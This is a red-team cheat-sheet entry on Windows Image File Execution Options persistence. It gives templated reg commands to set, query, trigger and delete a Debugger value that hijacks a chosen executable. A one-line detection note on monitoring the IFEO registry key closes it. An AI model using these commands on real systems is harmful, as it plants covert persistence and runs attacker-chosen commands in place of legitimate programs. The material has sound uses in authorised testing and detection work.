---
technique: Image File Execution Options
category: persistence
targets: Windows Registry
protocols: Local
remote_capable: false
tags: windows persistence privilege-escalation registry ifeo debugger
---

# Image File Execution Options

Image File Execution Options can attach a debugger command to a target executable name. When that executable launches, Windows starts the configured debugger instead.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Registry write | HKLM IFEO writes require administrator rights |
| Trigger binary | The target executable must run after the debugger value is set |
| Debugger path | The debugger command must be reachable and executable |

## Windows

### Set IFEO debugger

#cmd #registry #ifeo

Set a debugger command for a target executable name.

```cmd title:"Set IFEO debugger command"
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$image_name" /v Debugger /t REG_SZ /d "$debugger_command" /f
```
<!-- cheat
var image_name
var debugger_command
-->

### Query IFEO debugger

#cmd #registry #ifeo

Query the debugger value for a target executable name.

```cmd title:"Query IFEO debugger command"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$image_name" /v Debugger
```
<!-- cheat
var image_name
-->

### Trigger IFEO target

#cmd #ifeo

Launch the target executable to trigger the debugger command.

```cmd title:"Trigger IFEO target executable"
$image_name
```
<!-- cheat
var image_name
-->

### Delete IFEO debugger

#cmd #registry #cleanup

Remove the IFEO debugger value for a target executable name.

```cmd title:"Delete IFEO debugger value"
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$image_name" /v Debugger /f
```
<!-- cheat
var image_name
-->

## Linux

No Linux operator command is included here. This note covers Windows registry persistence commands.

## Detection

Monitor registry changes below `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options` and the Wow6432Node equivalent.
